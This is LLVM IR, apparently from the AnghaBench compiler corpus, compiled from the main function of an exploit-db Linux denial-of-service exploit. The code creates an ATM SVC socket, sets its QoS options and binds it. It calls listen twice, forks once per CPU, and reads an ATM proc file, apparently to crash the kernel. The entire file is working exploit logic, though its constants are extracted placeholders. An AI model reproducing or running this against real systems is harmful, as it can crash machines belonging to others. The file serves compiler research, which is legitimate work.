; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_7454.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_7454.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.atm_qos = type { i32, i32, %struct.TYPE_4__, %struct.TYPE_3__ }
%struct.TYPE_4__ = type { i8* }
%struct.TYPE_3__ = type { i8* }
%struct.sockaddr_atmsvc = type { i32, i32, %struct.TYPE_4__, %struct.TYPE_3__ }
%struct.sockaddr = type { i32 }

@PF_ATMSVC = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@ATM_UBR = common dso_local global i8* null, align 8
@ATM_NO_AAL = common dso_local global i32 0, align 4
@SOL_ATM = common dso_local global i32 0, align 4
@SO_ATMQOS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [10 x i8] c"failed !\0A\00", align 1
@AF_ATMSVC = common dso_local global i32 0, align 4
@NUM_CPUS = common dso_local global i32 0, align 4
@ATM = common dso_local global i32 0, align 4
@O_RDONLY = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca [2000 x i8], align 16
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.atm_qos, align 8
  %9 = alloca %struct.sockaddr_atmsvc, align 8
  store i32 0, i32* %1, align 4
  %10 = load i32, i32* @PF_ATMSVC, align 4
  %11 = load i32, i32* @SOCK_DGRAM, align 4
  %12 = call i32 @socket(i32 %10, i32 %11, i32 0)
  store i32 %12, i32* %6, align 4
  %13 = bitcast %struct.atm_qos* %8 to %struct.sockaddr_atmsvc*
  %14 = call i32 @memset(%struct.sockaddr_atmsvc* %13, i32 0, i32 24)
  %15 = load i8*, i8** @ATM_UBR, align 8
  %16 = getelementptr inbounds %struct.atm_qos, %struct.atm_qos* %8, i32 0, i32 3
  %17 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %16, i32 0, i32 0
  store i8* %15, i8** %17, align 8
  %18 = load i8*, i8** @ATM_UBR, align 8
  %19 = getelementptr inbounds %struct.atm_qos, %struct.atm_qos* %8, i32 0, i32 2
  %20 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %19, i32 0, i32 0
  store i8* %18, i8** %20, align 8
  %21 = load i32, i32* @ATM_NO_AAL, align 4
  %22 = getelementptr inbounds %struct.atm_qos, %struct.atm_qos* %8, i32 0, i32 1
  store i32 %21, i32* %22, align 4
  %23 = load i32, i32* %6, align 4
  %24 = load i32, i32* @SOL_ATM, align 4
  %25 = load i32, i32* @SO_ATMQOS, align 4
  %26 = bitcast %struct.atm_qos* %8 to %struct.sockaddr_atmsvc*
  %27 = call i32 @setsockopt(i32 %23, i32 %24, i32 %25, %struct.sockaddr_atmsvc* %26, i32 24)
  store i32 %27, i32* %5, align 4
  %28 = load i32, i32* %5, align 4
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %30, label %32

30:                                               ; preds = %0
  %31 = call i32 @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %64

32:                                               ; preds = %0
  %33 = call i32 @memset(%struct.sockaddr_atmsvc* %9, i32 0, i32 24)
  %34 = load i32, i32* @AF_ATMSVC, align 4
  %35 = getelementptr inbounds %struct.sockaddr_atmsvc, %struct.sockaddr_atmsvc* %9, i32 0, i32 0
  store i32 %34, i32* %35, align 8
  %36 = load i32, i32* %6, align 4
  %37 = bitcast %struct.sockaddr_atmsvc* %9 to %struct.sockaddr*
  %38 = call i32 @bind(i32 %36, %struct.sockaddr* %37, i32 24)
  %39 = load i32, i32* %6, align 4
  %40 = call i32 @listen(i32 %39, i32 10)
  %41 = load i32, i32* %6, align 4
  %42 = call i32 @listen(i32 %41, i32 10)
  store i32 1, i32* %4, align 4
  br label %43

43:                                               ; preds = %52, %32
  %44 = load i32, i32* %4, align 4
  %45 = load i32, i32* @NUM_CPUS, align 4
  %46 = icmp slt i32 %44, %45
  br i1 %46, label %47, label %55

47:                                               ; preds = %43
  %48 = call i64 (...) @fork()
  %49 = icmp ne i64 %48, 0
  br i1 %49, label %50, label %51

50:                                               ; preds = %47
  br label %55

51:                                               ; preds = %47
  br label %52

52:                                               ; preds = %51
  %53 = load i32, i32* %4, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %4, align 4
  br label %43

55:                                               ; preds = %50, %43
  %56 = load i32, i32* @ATM, align 4
  %57 = load i32, i32* @O_RDONLY, align 4
  %58 = call i32 @open(i32 %56, i32 %57)
  store i32 %58, i32* %7, align 4
  %59 = load i32, i32* %7, align 4
  %60 = bitcast [2000 x i8]* %3 to i8**
  %61 = call i32 @read(i32 %59, i8** %60, i32 2000)
  store i32 %61, i32* %5, align 4
  %62 = load i32, i32* %7, align 4
  %63 = call i32 @close(i32 %62)
  store i32 0, i32* %1, align 4
  br label %64

64:                                               ; preds = %55, %30
  %65 = load i32, i32* %1, align 4
  ret i32 %65
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @memset(%struct.sockaddr_atmsvc*, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, %struct.sockaddr_atmsvc*, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @open(i32, i32) #1

declare dso_local i32 @read(i32, i8**, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
